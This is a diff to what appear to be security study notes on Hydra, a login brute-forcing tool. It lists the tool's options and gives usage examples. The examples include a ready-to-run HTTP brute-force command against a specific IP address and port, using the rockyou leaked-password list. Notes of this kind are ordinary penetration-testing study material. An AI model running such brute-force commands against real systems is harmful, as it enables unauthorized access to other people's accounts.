@@ -8,3 +8,24 @@ Hydra is a handy tool for Login Brute Forcing, as it covers a wide variety of at
 
 	apt install hydra
 
+## Options
+
+	-U : shows the parameters required by an hydra module
+	-C <path_to_wordlist>: Combined credentials wordlist
+	-L <path_to_username_wordlist> : username wordlist
+	-l <username> : specify a static username to use
+	-P <path_to_passoword_wordlist> : password wordlist
+	-p <password> : specify a static password to use
+	-s <port>: target port
+	-f : tell hydra to stop when we have a successfull brute force
+	-u: tells hydra to first try all users for each password. Instead of the normal behaviour of trying all passwords for each user. This is usefull for gigantic password lists like rockyou
+	http-get : Get request method
+	/ : Target url path
+
+## Usage
+
+	hydra -C <path_to_wordlist> <server_ip> -s <port> http-get /
+
+Using different wordlists
+
+	hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
